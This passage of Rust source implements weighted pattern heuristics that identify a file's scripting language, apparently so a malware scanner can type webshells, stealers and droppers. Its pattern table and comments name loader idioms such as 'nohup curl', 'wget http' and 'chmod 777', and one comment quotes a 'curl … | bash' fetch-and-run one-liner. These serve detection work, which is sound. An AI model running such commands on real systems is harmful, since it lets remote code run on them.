//! Lightweight content heuristics for files where neither magic bytes nor
//! extension gave a result.
//!
//! Uses a single Aho-Corasick automaton (built once, cached in a `LazyLock`)
//! to scan the file prefix in one pass. Pattern hits are bucketed by language
//! and scored. This replaces ~80 independent `memmem::find` calls with a
//! single linear scan.
//!
//! Pattern selection: only high-signal patterns (weight >= 5) are included.
//! Each language has at least one conclusive (weight=10) pattern and 2-3
//! supporting patterns. This keeps the automaton small and cache-friendly.

use std::{borrow::Cow, sync::LazyLock};

use aho_corasick::AhoCorasick;

use super::{
    FileType, scripts,
    scripts::{contains, contains_ci, find_ci},
    strip_utf8_bom,
};

/// Minimum bytes of non-whitespace content required before we trust heuristics.
const MIN_CONTENT_BYTES: usize = 16;

/// Maximum bytes to scan for heuristics.
const SCAN_LIMIT: usize = 4096;

/// Largest image a DOS COM program can occupy: one 64 KiB segment less the PSP.
pub(super) const DOS_COM_MAX_SIZE: usize = 0xFF00;

/// How many bytes from the end to check when the head is mostly whitespace.
const TAIL_SIZE: usize = 2048;

/// Minimum score to consider a language match.
const THRESHOLD: u16 = 10;

/// A head scoring this much is two conclusive tokens, or a handful of
/// supporting ones: it already looks like a real unit, so the window after it
/// may not replace it.
const SETTLED_HEAD_SCORE: u16 = 40;

/// How close, as a percentage of the best score, a runner-up may come before
/// the two are too close to call.
const AMBIGUOUS_PERCENT: u32 = 60;

/// How much of a named source file [`contradicts_extension`] reads with the
/// line grammars. A script misnamed as another language shows it early.
const CONTRADICTION_WINDOW: usize = 8 * 1024;

/// Most UTF-16 text that is narrowed for scoring. Far past every window the
/// scorers read, including the tail of a padded file.
const DECODE_LIMIT: usize = 4 << 20;

/// Significant lines a document needs before its shape is judged as YAML. Short
/// fragments carry too little structure to separate a mapping from prose.
const MIN_YAML_LINES: usize = 5;

#[derive(Clone, Copy)]
struct PatternEntry {
    lang: Lang,
    weight: u8,
}

/// Declares [`Lang`], [`LANGS`] and [`Lang::to_file_type`] from one list, so
/// a language's score index, its place in `LANGS` and the [`FileType`] it
/// reports cannot drift apart. Each name is also the `FileType` it reports.
macro_rules! scored_languages {
    ($($lang:ident),+ $(,)?) => {
        #[derive(Clone, Copy, PartialEq, Eq, Debug)]
        enum Lang {
            $($lang),+
        }

        /// All languages in score-index order, which is also the order a tie
        /// for the best score is broken in.
        const LANGS: &[Lang] = &[$(Lang::$lang),+];

        impl Lang {
            fn to_file_type(self) -> FileType {
                match self {
                    $(Self::$lang => FileType::$lang),+
                }
            }
        }
    };
}

scored_languages! {
    Shell,
    Python,
    PowerShell,
    Perl,
    Php,
    Batch,
    Vbs,
    Lua,
    JavaScript,
    C,
    Kotlin,
    Dockerfile,
    Clojure,
    AppleScript,
    ObjectiveC,
}

const LANG_COUNT: usize = LANGS.len();

impl Lang {
    /// Index into the scores array: the declaration order of [`LANGS`].
    const fn idx(self) -> usize {
        self as usize
    }

    /// The scored language a file type names, if the table scores it.
    fn from_file_type(ft: FileType) -> Option<Self> {
        LANGS.iter().copied().find(|l| l.to_file_type() == ft)
    }
}

// High-signal patterns only. Each language needs >=10 points to match.
// Conclusive (10) = almost never appears outside this language.
// Strong (5)      = common idiom, needs a second hit to confirm.
const PATTERNS: &[(&[u8], Lang, u8)] = &[
    // ── Shell ──
    (b"export ", Lang::Shell, 5),
    (b"set -e", Lang::Shell, 5),
    (b"if [", Lang::Shell, 5),
    (b"case $", Lang::Shell, 5),
    (b"; then\n", Lang::Shell, 5),
    (b"; then\r", Lang::Shell, 5),
    (b"; do\n", Lang::Shell, 5),
    (b"; do\r", Lang::Shell, 5),
    (b" && curl ", Lang::Shell, 10),
    // Extensionless one-liners (`nohup curl -s https://… | bash`) carry no
    // shebang and no shell extension, so they used to stay Unknown and every
    // shell rule missed them. `nohup curl ` is a command sequence, not prose.
    (b"nohup curl ", Lang::Shell, 10),
    (b" && chmod +x ", Lang::Shell, 10),
    (b"cd $", Lang::Shell, 5),
    (b"curl -O http", Lang::Shell, 5),
    // Extensionless shell loaders commonly use wget and world-writable mode
    // assignment instead of curl's `-O` / `chmod +x` forms. These are
    // strong command-language signal while remaining below the threshold
    // individually, so prose mentioning one command does not type itself.
    (b"cd /", Lang::Shell, 5),
    (b" || /", Lang::Shell, 5),
    (b"wget http", Lang::Shell, 5),
    (b"chmod 777 ", Lang::Shell, 5),
    (b"xattr -c ", Lang::Shell, 5),
    // pacman/AUR `.install` scriptlet hook functions. These are shell function
    // definitions (`name() {`) with names reserved by pacman's install-scriptlet
    // convention, so the `() {` definition form keyed to a pacman hook name is
    // conclusive shell — it never appears in other languages. Detecting these by
    // content (not by the `.install` extension) avoids mis-typing Debian
    // `debian/*.install` files, which share the extension but are plain
    // newline-separated path lists with no scriptlet functions. Content-based
    // detection also recovers scriptlets shipped with a renamed or absent
    // extension.
    (b"post_install() {", Lang::Shell, 10),
    (b"pre_install() {", Lang::Shell, 10),
    (b"post_upgrade() {", Lang::Shell, 10),
    (b"pre_upgrade() {", Lang::Shell, 10),
    (b"post_remove() {", Lang::Shell, 10),
    (b"pre_remove() {", Lang::Shell, 10),
    // ── Python ──
    (b"if __name__", Lang::Python, 10),
    (b"import os", Lang::Python, 10),
    (b"base64.b64decode", Lang::Python, 10),
    (b"def ", Lang::Python, 5),
    (b"except ", Lang::Python, 5),
    (b"exec(", Lang::Python, 5),
    (b"subprocess.", Lang::Python, 5),
    (b"self.", Lang::Python, 5),
    // ── PowerShell ──
    (b"$ErrorActionPreference", Lang::PowerShell, 10),
    (b"[System.Convert]", Lang::PowerShell, 10),
    (b" -bxor ", Lang::PowerShell, 10),
    (b"Write-Host", Lang::PowerShell, 5),
    (b"Invoke-", Lang::PowerShell, 5),
    (b"New-Object", Lang::PowerShell, 5),
    // Advanced-function and assembly-loading syntax. A clipboard stealer named
    // `.posh` opened with `Add-Type -AssemblyName` and `[CmdletBinding()]` and
    // scored only `Invoke-` (5), so it stayed Unknown and no rule walked it.
    // Neither form exists outside PowerShell: C# cmdlets declare `[Cmdlet(...)]`,
    // and `$env:` is the PowerShell environment drive (`%X%` in batch, `$X` in
    // shell).
    (b"[CmdletBinding(", Lang::PowerShell, 10),
    (b"Add-Type -", Lang::PowerShell, 10),
    (b"$env:", Lang::PowerShell, 5),
    (b"[Byte[]]", Lang::PowerShell, 10),
    // ── Perl ──
    (b"use strict;", Lang::Perl, 10),
    (b"use warnings;", Lang::Perl, 10),
    (b"use strict\n", Lang::Perl, 10),
    (b"use strict\r", Lang::Perl, 10),
    (b"use warnings\n", Lang::Perl, 10),
    (b"use warnings\r", Lang::Perl, 10),
    (b"my $", Lang::Perl, 5),
    (b"chomp", Lang::Perl, 5),
    // ── PHP ──
    // Some malware corpora contain PHP fragments or PHP+HTML hybrids without a
    // leading `<?php` tag. Score PHP-specific globals and WordPress hook idioms
    // so `elseif ` in those files does not incorrectly win as Lua.
    (b"<?php", Lang::Php, 10),
    // A short open tag at a line break (`<?` then whitespace). `<?php` is
    // scored above, and this form does not match `<?xml`. One
    // `stripslashes(` plus a `document.write` later in the same head used
    // to tie JavaScript and leave the file unidentified.
    (b"<?\n", Lang::Php, 10),
    (b"<?\r", Lang::Php, 10),
    (b"<? ", Lang::Php, 10),
    (b"$_SERVER", Lang::Php, 10),
    // PHP 4 class properties are `var $name`. The same `var ` prefix is a
    // JavaScript declaration; the JS scorer skips the `$` form so a short-tag
    // webshell full of `var $pwd` does not tie and stay unidentified.
    (b"var $", Lang::Php, 10),
    // Posted-command webshells unescape with stripslashes(). No other
    // language spells that function.
    (b"stripslashes(", Lang::Php, 10),
    (b"$_POST", Lang::Php, 10),
    (b"$_GET", Lang::Php, 10),
    (b"add_filter(", Lang::Php, 10),
    (b"add_action(", Lang::Php, 10),
    (b"esc_html(", Lang::Php, 5),
    (b"preg_replace(", Lang::Php, 5),
    // ── Batch ──
    (b"@echo", Lang::Batch, 10),
    (b"@ECHO", Lang::Batch, 10),
    (b"%~dp0", Lang::Batch, 10),
    (b"SETLOCAL", Lang::Batch, 5),
    (b"GOTO ", Lang::Batch, 5),
    (b"IF EXIST", Lang::Batch, 5),
    // The three above are upper-case only, and batch is a case-insensitive
    // language that people write in lower case. A script that opens with
    // something other than `@echo off` therefore scored zero for Batch and
    // was typed by its extension -- vxheaven's `Virus.BAT.Companion.a` starts
    // `@ctty nul` and was read as an ar archive because its variant letter is
    // `.a`. Adding lower-case `goto`/`if exist` would collide with C and Go;
    // these four are spelled the same way nowhere else.
    (b"errorlevel", Lang::Batch, 10),
    (b"ERRORLEVEL", Lang::Batch, 10),
    (b"ctty ", Lang::Batch, 10),
    (b"attrib +", Lang::Batch, 5),
    // `@` before a command suppresses its echo, and `if exist` is the batch
    // file test. Scripts that never say `@echo off` still write
    // `@if exist C:\x del C:\x` on every line -- vxheaven's Trojan.BAT.DelFiles.m
    // did, and was typed Objective-C from its variant letter. SCSS has `@if`
    // but never `@if exist`.
    (b"@if exist ", Lang::Batch, 10),
    // The doubled `%%` is how a batch file spells a loop variable.
    (b"for %%", Lang::Batch, 10),
    (b"@if not exist ", Lang::Batch, 10),
    (b"@deltree ", Lang::Batch, 10),
    (b"@del ", Lang::Batch, 5),
    (b"@copy ", Lang::Batch, 5),
    // ── VBScript ──
    (b"WScript.", Lang::Vbs, 10),
    (b"Option Explicit", Lang::Vbs, 10),
    (b"CreateObject(", Lang::Vbs, 5),
    (b"End Sub", Lang::Vbs, 5),
    (b"End Function", Lang::Vbs, 5),
    // ── Lua ──
    (b"setmetatable", Lang::Lua, 10),
    (b"getmetatable", Lang::Lua, 10),
    (b"getfenv", Lang::Lua, 10),
    (b"setfenv", Lang::Lua, 10),
    (b"ipairs(", Lang::Lua, 5),
    (b"pairs(", Lang::Lua, 5),
    (b"elseif ", Lang::Lua, 5),
    // Obfuscated Lua (Prometheus, Luraph and kin) ships as one minified line,
    // and the environment calls above sit at its far end, past every window.
    // A bare `...` parameter list is Lua's vararg -- JavaScript's rest
    // parameter needs a name -- and `local function` is spelled nowhere else.
    // Minifiers glue `end` to the preceding bracket; no other scored language
    // closes a block that way.
    (b"function(...)", Lang::Lua, 10),
    (b"local function ", Lang::Lua, 10),
    (b"]end ", Lang::Lua, 5),
    (b")end ", Lang::Lua, 5),
    // ── JavaScript ──
    (b"module.exports", Lang::JavaScript, 10),
    (b"(function(", Lang::JavaScript, 5),
    (b"===", Lang::JavaScript, 5),
    // `console.log(` (the JS call), not bare `console.` — the latter matches
    // source filenames like `console.cpp` / `reporter_console.cpp` listed in
    // build files, mis-typing them as JavaScript.
    (b"console.log(", Lang::JavaScript, 5),
    (b"document.", Lang::JavaScript, 5),
    (b"window.", Lang::JavaScript, 5),
    (b"addEventListener", Lang::JavaScript, 5),
    // Forms that appear in modern JS with none of the tokens above: an arrow
    // function with a block body, JSON serialization, and CommonJS require.
    // An untyped fragment of a payload (`const b = ...; fetch(url, {...})
    // .catch(() => {})`) previously scored 5 and typed as unknown, which
    // means no rule of any kind ever ran on it.
    (b"=> {", Lang::JavaScript, 5),
    (b"JSON.stringify", Lang::JavaScript, 10),
    (b"require(\"", Lang::JavaScript, 10),
    (b"require('", Lang::JavaScript, 10),
    // `var `/`let `/`const ` are JS variable declarations. `var ` especially is
    // dense in obfuscated/minified JS (every renamed local), so it must score
    // for JS — not only Kotlin (which prefers `val`). Supporting weight: a
    // single decl word isn't conclusive on its own.
    (b"var ", Lang::JavaScript, 5),
    (b"let ", Lang::JavaScript, 5),
    (b"const ", Lang::JavaScript, 5),
    // ── C/C++/ASM ──
    (b"#include <", Lang::C, 10),
    (b"#include \"", Lang::C, 10),
    (b"section .text", Lang::C, 10),
    (b"[BITS 32]", Lang::C, 10),
    // ── Kotlin ──
    // `package ` is NOT conclusive: it appears in English prose ("a package
    // for…"), Java, and package-manifest text, so it stays a supporting weight
    // and must be corroborated by a second Kotlin hit. The Kotlin-exclusive
    // tokens (`import kotlin`, `suspend fun `) carry the conclusive weight.
    (b"package ", Lang::Kotlin, 5),
    (b"import kotlin", Lang::Kotlin, 10),
    (b"fun main(", Lang::Kotlin, 5),
    // `val ` is Kotlin-characteristic (Kotlin prefers immutable `val`); `var `
    // was removed here because it is a core JavaScript keyword and dominates
    // obfuscated JS, mis-scoring var-heavy scripts as Kotlin. Kotlin still has
    // conclusive markers (`import kotlin`, `suspend fun `) plus `val `.
    (b"val ", Lang::Kotlin, 5),
    (b"suspend fun ", Lang::Kotlin, 10),
    // ── Dockerfile ──
    (b"\nFROM ", Lang::Dockerfile, 10),
    (b"FROM scratch", Lang::Dockerfile, 10),
    (b"\nRUN ", Lang::Dockerfile, 5),
    (b"\nCMD [", Lang::Dockerfile, 10),
    (b"\nENTRYPOINT", Lang::Dockerfile, 10),
    (b"\nWORKDIR ", Lang::Dockerfile, 5),
    (b"\nCOPY ", Lang::Dockerfile, 5),
    (b"\nEXPOSE ", Lang::Dockerfile, 5),
    (b"\nVOLUME ", Lang::Dockerfile, 5),
    (b"\nHEALTHCHECK", Lang::Dockerfile, 10),
    // ── Clojure / ClojureScript / EDN ──
    // Clojure source heavily shares tokens with the Python pattern list
    // (`def `, `exec(`, `self.`) so its conclusive patterns are weighted high
    // enough to win even when Python scores on incidental hits.
    (b"(defn ", Lang::Clojure, 10),
    (b"(defn- ", Lang::Clojure, 10),
    (b"(defmacro ", Lang::Clojure, 10),
    (b"(defprotocol ", Lang::Clojure, 10),
    (b"(defmethod ", Lang::Clojure, 10),
    (b"(defmulti ", Lang::Clojure, 10),
    (b"(defrecord ", Lang::Clojure, 10),
    (b"(deftype ", Lang::Clojure, 10),
    (b"(ns ", Lang::Clojure, 10),
    (b":require ", Lang::Clojure, 10),
    (b":require\n", Lang::Clojure, 10),
    (b":require\r", Lang::Clojure, 10),
    (b"#?(:clj", Lang::Clojure, 10),
    (b"#?(:cljs", Lang::Clojure, 10),
    (b"(let [", Lang::Clojure, 5),
    (b"(if-let [", Lang::Clojure, 5),
    (b"(when-let [", Lang::Clojure, 5),
    (b"(fn [", Lang::Clojure, 5),
    // ── AppleScript ──
    // AMOS/Shub-family stealers are routinely delivered as plaintext AppleScript
    // with a random or `.unknown` extension, so content sniffing matters. These
    // idioms are AppleScript-exclusive (no other scripting language uses them):
    // `do shell script`, `tell application "`, `quoted form of`, `POSIX path of`,
    // and the `on <handler>(` / `end <handler>` block form.
    (b"do shell script", Lang::AppleScript, 10),
    (b"tell application \"", Lang::AppleScript, 10),
    (b"quoted form of", Lang::AppleScript, 10),
    (b"POSIX path of", Lang::AppleScript, 10),
    (b"end tell", Lang::AppleScript, 5),
    (b"end repeat", Lang::AppleScript, 5),
    (b"on run", Lang::AppleScript, 5),
    (b"with hidden answer", Lang::AppleScript, 10),
    // ── Objective-C ──
    // The compiler directives no C, C++ or Swift file spells. Objective-C is
    // a superset of C, so a real `.m` also scores for C on every `#include`;
    // `detect_from_content` resolves that pairing toward Objective-C. Without
    // these a genuine `.m` scored only as C and lost its type.
    // `@property` alone is a Python decorator, so only the attribute form.
    (b"@interface ", Lang::ObjectiveC, 10),
    (b"@implementation ", Lang::ObjectiveC, 10),
    (b"@autoreleasepool", Lang::ObjectiveC, 10),
    (b"@selector(", Lang::ObjectiveC, 10),
    (b"@synthesize ", Lang::ObjectiveC, 10),
    (b"@property (", Lang::ObjectiveC, 10),
    (b"@property(", Lang::ObjectiveC, 10),
    (b"#import <", Lang::ObjectiveC, 10),
    (b"#import \"", Lang::ObjectiveC, 10),
    (b"NSLog(@\"", Lang::ObjectiveC, 10),
    (b"alloc] init", Lang::ObjectiveC, 10),
    (b"@end\n", Lang::ObjectiveC, 5),
    (b"@end\r", Lang::ObjectiveC, 5),
];

struct AcScanner {
    ac: AhoCorasick,
    entries: Vec<PatternEntry>,
}

/// The automaton over [`PATTERNS`]. The patterns are fixed at compile time,
/// so a build failure is a bug in this file, not something an input can cause;
/// it panics on first use rather than quietly disabling every language.
static SCANNER: LazyLock<AcScanner> = LazyLock::new(|| AcScanner {
    ac: AhoCorasick::new(PATTERNS.iter().map(|(pattern, _, _)| pattern))
        .expect("heuristic patterns are a valid Aho-Corasick set"),
    entries: PATTERNS
        .iter()
        .map(|&(_, lang, weight)| PatternEntry { lang, weight })
        .collect(),
});

/// Check if the first `limit` bytes are mostly whitespace.
fn is_mostly_whitespace(data: &[u8], limit: usize) -> bool {
    let head = &data[..data.len().min(limit)];
    let non_ws = head.iter().filter(|&&b| !b.is_ascii_whitespace()).count();
    non_ws < MIN_CONTENT_BYTES
}

/// Single-pass scan using Aho-Corasick. Returns per-language scores.
fn scan_scores(data: &[u8]) -> [u16; LANG_COUNT] {
    let s = &*SCANNER;
    let mut scores = [0u16; LANG_COUNT];

    for mat in s.ac.find_overlapping_iter(data) {
        // `===` (JS strict-equality) must not score when it is part of a
        // longer run of '=' — e.g. "=========" separator lines or reST/
        // Markdown header rules. Overlapping matches across such a run would
        // otherwise inflate the JavaScript score and mis-type plain text.
        if &data[mat.start()..mat.end()] == b"===" {
            let prev_eq = mat.start() > 0 && data[mat.start() - 1] == b'=';
            let next_eq = mat.end() < data.len() && data[mat.end()] == b'=';
            if prev_eq || next_eq {
                continue;
            }
        }
        // `document.`/`window.` are JS DOM-global accesses only when a member
        // name follows (document.getElementById, window.location). English
        // prose ends sentences with "…this document." / "…the window.", where
        // the dot is followed by whitespace/EOL/an uppercase next sentence —
        // never a lowercase member. Require a lowercase member char so a
        // license, README, or changelog does not score as JavaScript.
        let m = &data[mat.start()..mat.end()];
        if (m == b"document." || m == b"window.")
            && !data.get(mat.end()).is_some_and(u8::is_ascii_lowercase)
        {
            continue;
        }
        // `start WScript.exe x.vbs` is a batch file launching the host, not
        // VBScript calling it; the object model is `WScript.Echo`,
        // `WScript.CreateObject`, never `.exe`.
        if m == b"WScript."
            && data
                .get(mat.end()..mat.end() + 3)
                .is_some_and(|x| x.eq_ignore_ascii_case(b"exe"))
        {
            continue;
        }
        // `var $name` is a PHP 4 property, not a JavaScript binding.
        if m == b"var " && data.get(mat.end()) == Some(&b'$') {
            continue;
        }
        // "itself." contains `self.`, "Applet " contains `let `, and
        // "eval " contains `val `. A declaration sits on a token boundary;
        // `let ` followed by a function word is prose.
        if matches!(
            m,
            b"let " | b"var " | b"const " | b"def " | b"except " | b"self." | b"val "
        ) && mat.start() > 0
            && data[mat.start() - 1].is_ascii_alphanumeric()
        {
            continue;
        }
        if m == b"let " {
            let rest = &data[mat.end()..];
            const PROSE: &[&[u8]] = &[
                b"the ", b"the\n", b"a ", b"an ", b"us ", b"me ", b"it ", b"you ", b"them ",
                b"this ", b"that ", b"your ", b"there ", b"him ", b"her ",
            ];
            if PROSE.iter().any(|word| rest.starts_with(word)) {
                continue;
            }
        }
        let entry = &s.entries[mat.pattern().as_usize()];
        let idx = entry.lang.idx();
        scores[idx] = scores[idx].saturating_add(u16::from(entry.weight));
    }

    scores
}

/// Try to identify a file type from content patterns.
/// Called after magic detection when the filename does not provide a strong content type.
pub(crate) fn detect_from_content(data: &[u8]) -> Option<FileType> {
    if data.len() < 4 {
        return None;
    }

    // Every scorer below reads bytes. Windows scripts are routinely saved as
    // UTF-16, which reads as alternating NULs -- two thirds of the VBScript
    // droppers in one triage set were, and none of them scored at all.
    if let Some(text) = decoded_text(data) {
        return detect_from_content(&text);
    }

    // Detection rules, CI configuration, and package manifests quote the very
    // tokens this table scores: a rule pack hunting Python stagers contains
    // `import os`, one hunting macOS stealers contains `do shell script`. The
    // document is data about a language, not the language. Extensions normally
    // settle this (`ext::is_data_format`), but a renamed, disabled, or
    // extensionless copy reaches content sniffing, so the document shape has to
    // decide. Structured data is never one of the scored languages.
    if looks_like_structured_data(data) {
        return None;
    }

    // Take the scan window from the first byte that carries content. Padding a
    // one-line payload off the left margin with several hundred spaces is a
    // real evasion (seen on a `.woff2`-named Node loader with 997 leading
    // spaces): it pushes enough scoring tokens out of a fixed-size head window
    // to drop the file below THRESHOLD, and an unidentified file is skipped
    // entirely by consumers. Skipping the run costs one `position` call and
    // makes the window measure content rather than indentation.
    let content_start = data
        .iter()
        .position(|b| !b.is_ascii_whitespace())
        .unwrap_or(data.len());
    let body = &data[content_start..];
    let head = &body[..body.len().min(SCAN_LIMIT)];
    // Batch, VBScript, mIRC and ircII are read line by line, verb first. That
    // runs ahead of the binary and prose guards on purpose: batch files carry
    // ANSI escapes and `echo` whole paragraphs, and the line grammar is what
    // tells a script that talks from prose that mentions a command.
    let script = scripts::evidence(body);
    // A Dockerfile's `COPY src /dst` reads as a Windows `copy` with a switch;
    // one that opens with `FROM` or `ARG` is left to the token table.
    let verdict = script
        .verdict()
        .filter(|_| !starts_with_dockerfile_instruction(body));
    if let Some(ft) = verdict {
        return Some(ft);
    }

    // Every scored language is text. A DOS COM file is not, and it does not
    // have to look like Clojure to be typed as Clojure -- `#'` is two bytes,
    // and two chance occurrences in a kilobyte of x86 reach THRESHOLD on their
    // own. vxheaven's Virus.DOS.FastKiller.481 landed as Clojure that way, and
    // an unparseable "source" file is worth less than an unidentified one.
    //
    // Judged on control bytes in the head: source essentially never carries a
    // byte below 0x20 that is not tab, newline or carriage return, and object
    // code is full of them.
    if looks_like_binary(head) {
        return None;
    }

    // Natural-language prose is never one of the scored languages either, but
    // it does quote their keywords: a novel has `const`, `let `, `var ` and
    // `new ` in every chapter, and 1 MB of it typed as JavaScript sends
    // tree-sitter's GLR error recovery on a 20 s walk (observed: an
    // extensionless Tom Sawyer in a fuzz corpus). Code carries punctuation
    // prose does not, and the head alone tells them apart.
    if data.len() >= PROSE_GUARD_MIN_BYTES && looks_like_prose(head) {
        return None;
    }

    // If the head is mostly whitespace, also scan the tail
    let scores = if is_mostly_whitespace(body, SCAN_LIMIT) && body.len() > SCAN_LIMIT {
        let tail_start = body.len().saturating_sub(TAIL_SIZE);
        let tail = &body[tail_start..];
        let head_scores = scan_scores(head);
        let tail_scores = scan_scores(tail);
        let mut merged = [0u16; LANG_COUNT];
        for i in 0..LANG_COUNT {
            merged[i] = head_scores[i].max(tail_scores[i]);
        }
        merged
    } else {
        scan_scores(head)
    };
    // A preface can push the real language just past the first window: an ASP
    // one-liner list, then `<?php` shells a few hundred bytes later. Only the
    // next window may replace a head that never became conclusive.
    let scores = if !is_mostly_whitespace(body, SCAN_LIMIT) && body.len() > SCAN_LIMIT {
        let head_best = scores.iter().copied().max().unwrap_or(0);
        // A preface of `var ` / `eval ` scores too, and hides `<?php` a few
        // hundred bytes later. A head that already looks like a real unit
        // stays as it is.
        if head_best < SETTLED_HEAD_SCORE {
            let next = &body[SCAN_LIMIT..body.len().min(SCAN_LIMIT * 2)];
            let next_scores = scan_scores(next);
            let next_best = next_scores.iter().copied().max().unwrap_or(0);
            if next_best >= THRESHOLD
                && next_best > head_best
                && (head_best == 0 || !too_close(head_best, next_best))
            {
                next_scores
            } else {
                scores
            }
        } else {
            scores
        }
    } else {
        scores
    };

    // Batch's and VBScript's tokens are quoted by everything that drops or
    // launches them: a VBScript writing `@echo off` into a `.bat`, a makefile
    // recipe's `@echo`, JScript's `new ActiveXObject("WScript.Shell")`. Their
    // score only stands when some line is actually written in the language.
    let mut scores = scores;
    for (lang, ft) in [(Lang::Batch, FileType::Batch), (Lang::Vbs, FileType::Vbs)] {
        if script.has_lines() && (!script.supports(ft) || script.rules_out(ft)) {
            scores[lang.idx()] = 0;
        }
    }

    // Find the best and second-best scoring languages
    let mut best_lang: Option<Lang> = None;
    let mut best_score: u16 = 0;
    let mut second_score: u16 = 0;

    for (i, &score) in scores.iter().enumerate() {
        if score > best_score {
            second_score = best_score;
            best_score = score;
            best_lang = Some(LANGS[i]);
        } else if score > second_score {
            second_score = score;
        }
    }

    let mut lang = best_lang?;

    // Must meet threshold
    if best_score < THRESHOLD {
        return None;
    }

    // Objective-C is C plus directives C never has, so every `#include` in a
    // `.m` scores for C and a large file drowns the handful of `@interface`
    // lines. Any conclusive Objective-C directive settles it.
    let objc = scores[Lang::ObjectiveC.idx()];
    if lang == Lang::C && objc >= THRESHOLD {
        lang = Lang::ObjectiveC;
        best_score = objc;
        // Still ambiguous against any language other than its own C base.
        second_score = LANGS
            .iter()
            .filter(|l| !matches!(l, Lang::C | Lang::ObjectiveC))
            .map(|l| scores[l.idx()])
            .max()
            .unwrap_or(0);
    }

    // Ambiguity: if the second-best is close, bail
    if second_score > 0 && too_close(second_score, best_score) {
        return None;
    }

    // JavaScript's supporting tokens (`var `/`let `/`const `/`document.`…) are
    // short and accumulate in English prose — a license that mentions "tablet"
    // and "outlet" hits `let ` twice (= THRESHOLD), and a README ending
    // sentences with "this document." scores too. Real JavaScript also carries
    // structural syntax: statement terminators and block braces. Require that
    // structure so keyword hits alone never type prose as JavaScript. (Only the
    // heuristic stage is gated — files with a real `.js` extension are resolved
    // earlier by extension and never reach here.)
    if lang == Lang::JavaScript {
        let has_structure = |b: &[u8]| b.iter().any(|&c| matches!(c, b';' | b'{' | b'}'));
        let structured = has_structure(&data[..data.len().min(SCAN_LIMIT)])
            || (is_mostly_whitespace(data, SCAN_LIMIT)
                && data.len() > SCAN_LIMIT
                && has_structure(&data[data.len().saturating_sub(TAIL_SIZE)..]));
        if !structured {
            return None;
        }
    }

    // A Dockerfile must begin with FROM (ARG may precede it). `\nFROM ` alone is
    // not enough: uppercase SQL puts `FROM` at the start of a line too, and a
    // `SELECT … FROM users` query would otherwise type as a Dockerfile.
    if lang == Lang::Dockerfile && !starts_with_dockerfile_instruction(data) {
        return None;
    }

    // PHP is tag-delimited: code only runs between `<?`/`<?php`/`<?=` and `?>`.
    // Without a tag there is no PHP, however many superglobals or WordPress hook
    // names the bytes contain — and those names are ordinary text elsewhere.
    // Detection rules, WAF patterns, changelogs, and log lines quote `$_POST`
    // without being PHP, and a YAML rule file whose regexes match PHP stagers
    // quotes little else. Requiring a delimiter keeps such references from
    // typing data as PHP, while still admitting the tagless fragments this table
    // targets: a fragment cut from a larger file loses its opening tag but keeps
    // the closing one.
    if lang == Lang::Php {
        let tagged = has_php_tag(&data[..data.len().min(SCAN_LIMIT * 2)])
            || (is_mostly_whitespace(data, SCAN_LIMIT)
                && data.len() > SCAN_LIMIT
                && has_php_tag(&data[data.len().saturating_sub(TAIL_SIZE)..]));
        if !tagged {
            return None;
        }
    }

    Some(lang.to_file_type())
}

/// Whether `runner_up` scores within [`AMBIGUOUS_PERCENT`] of `best`, which
/// must be non-zero. Widened first: a saturated score times 100 overflows
/// `u16`.
fn too_close(runner_up: u16, best: u16) -> bool {
    u32::from(runner_up) * 100 / u32::from(best) > AMBIGUOUS_PERCENT
}

/// PowerShell droppers sometimes conceal commands in a decimal byte array:
/// `$name = @(83,116,97,114,116,...)`. The ordinary keyword scorer cannot see
/// any of the commands until that array is decoded. This shape is distinctive
/// enough to disambiguate an otherwise ambiguous `.ps` suffix when no PostScript
/// header is present.
pub(crate) fn has_powershell_char_code_array(data: &[u8]) -> bool {
    let head = &data[..data.len().min(SCAN_LIMIT)];
    let Some(start) = head.windows(2).position(|w| w == b"@(") else {
        return false;
    };
    // Require an assignment immediately before the array, allowing whitespace.
    let prefix = &head[..start];
    if prefix.iter().rev().find(|b| !b.is_ascii_whitespace()) != Some(&b'=') {
        return false;
    }

    let mut i = start + 2;
    let mut count = 0;
    loop {
        while head.get(i).is_some_and(u8::is_ascii_whitespace) {
            i += 1;
        }
        let digits = i;
        let mut value = 0u16;
        while let Some(b @ b'0'..=b'9') = head.get(i).copied() {
            value = value * 10 + u16::from(b - b'0');
            if value > 255 {
                return false;
            }
            i += 1;
        }
        let width = i - digits;
        if width == 0 || width > 3 {
            return false;
        }
        count += 1;
        while head.get(i).is_some_and(u8::is_ascii_whitespace) {
            i += 1;
        }
        match head.get(i) {
            Some(b',') => i += 1,
            Some(b')') => return count >= 8,
            _ => return false,
        }
    }
}

/// Only inputs at least this large are screened by [`looks_like_prose`]: a
/// tiny script (`echo hi`) can legitimately have no code punctuation at all,
/// and a mis-typed tiny file costs nothing to parse.
const PROSE_GUARD_MIN_BYTES: usize = 1024;

/// Bytes that appear in essentially every programming language and essentially
/// never in running prose: brackets, statement/assignment/comparison operators,
/// and the shell/comment sigils.
const CODE_PUNCT: &[u8] = b"{}[]();=<>$#@\\|&*";

fn is_code_punct(b: u8) -> bool {
    CODE_PUNCT_TABLE[usize::from(b)]
}

/// [`CODE_PUNCT`] as a lookup table: prose screening reads every byte of the
/// head, and a table is one load where a slice search is a call.
const CODE_PUNCT_TABLE: [bool; 256] = {
    let mut table = [false; 256];
    let mut i = 0;
    while i < CODE_PUNCT.len() {
        table[CODE_PUNCT[i] as usize] = true;
        i += 1;
    }
    table
};

/// `true` when the window carries enough control bytes that it cannot be one
/// of the scored languages.
///
/// Control bytes are the tell, not high bytes: bytes >= 0x80 are ordinary in
/// UTF-8 source and Latin-1 comments, while source essentially never contains
/// a byte below 0x20 that is not tab, newline or carriage return. Object code
/// is full of them -- the DOS sample that prompted this sits at 14% -- so a
/// small threshold separates the two decisively without judging encodings.
///
/// Stricter than `scripts::is_binary`, which also excuses form feed, ESC, SUB
/// and IRC formatting codes: the line grammars read batch and mIRC scripts,
/// whose `echo` lines and messages carry them, while the languages scored here
/// do not. `magic::content_is_text` reads only 64 bytes, so it allows no
/// control byte at all bar form feed.
fn looks_like_binary(head: &[u8]) -> bool {
    const MIN_BYTES: usize = 8;
    const MAX_CONTROL_PERCENT: usize = 3;
    // Below a line of text the percentage alone is one stray byte, so a short
    // window needs a few control bytes outright. The 27-byte COM infectors
    // (vxheaven's Virus.DOS.Trivial.27.m) carry ten; they used to be judged
    // too short to call and stayed Objective-C.
    const MIN_CONTROL_SHORT: usize = 3;
    if head.len() < MIN_BYTES {
        return false;
    }
    let control = head
        .iter()
